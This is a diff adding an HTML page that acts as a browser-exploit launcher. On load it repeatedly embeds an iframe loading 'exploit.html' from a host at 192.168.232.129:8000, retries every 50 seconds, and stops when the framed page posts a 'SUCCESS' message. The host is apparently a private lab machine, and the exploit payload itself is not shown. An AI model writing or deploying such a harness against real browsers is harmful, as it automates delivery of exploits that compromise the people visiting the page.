@@ -1,0 +1,37 @@
+<html>
+    <head>
+        <script>
+            var interval = null;
+            function iter() {
+                let iframe = null;
+
+                try {
+                    iframe = document.getElementById('myframe');
+                    document.body.removeChild(iframe);
+                } catch (e) {}
+
+                iframe = document.createElement('iframe');
+                iframe.src = 'http://192.168.232.129:8000/exploit.html';
+                iframe.id = 'myframe';
+                document.body.appendChild(iframe);
+                console.log(document.getElementById('myframe'));
+                if (interval === null) {
+                    interval = window.setInterval(iter, 50000);
+                }
+            }
+
+            function brute() {
+                let done = false;
+                iter();
+
+                window.onmessage = function(e) {
+                    if (e.data.includes('SUCCESS')) {
+                        console.log('exploit succesful');
+                        window.clearInterval(interval);
+                    }
+                }
+            }
+        </script>
+    </head>
+    <body onload="brute()"></body>
+</html>
